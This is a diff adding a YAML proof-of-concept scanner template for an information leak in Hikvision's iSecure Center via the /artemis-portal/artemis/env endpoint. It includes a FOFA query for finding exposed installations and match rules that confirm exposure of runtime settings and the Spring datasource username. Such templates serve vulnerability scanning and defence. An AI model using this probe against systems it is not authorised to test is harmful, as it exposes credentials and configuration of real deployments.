@@ -1,0 +1,18 @@
+id: poc-yaml-hikvision-artemis-env-info-leak
+info:
+  name: HIKVISION 综合安防管理平台 artemis/env 信息泄漏漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: HiKVISION 综合安防管理平台
+  fofa: app="HIKVISION-iSecure-Center"
+requests:
+- method: GET
+  path: /artemis-portal/artemis/env
+  expression: "status_code == 200 && \ncontains(find_json(body,\"profiles.0\"), \"\
+    prod\") && \ncontains(find_json(body,\"systemProperties\"), \"java.runtime.name\"\
+    ) &&\ncontains(find_json(body,\"systemProperties\"), \"java.class.path\") &&\n\
+    contains(find_json(body,\"bootstrapProperties\"), \"spring.datasource.username\"\
+    )\n"
+variables: {}
+transport: http
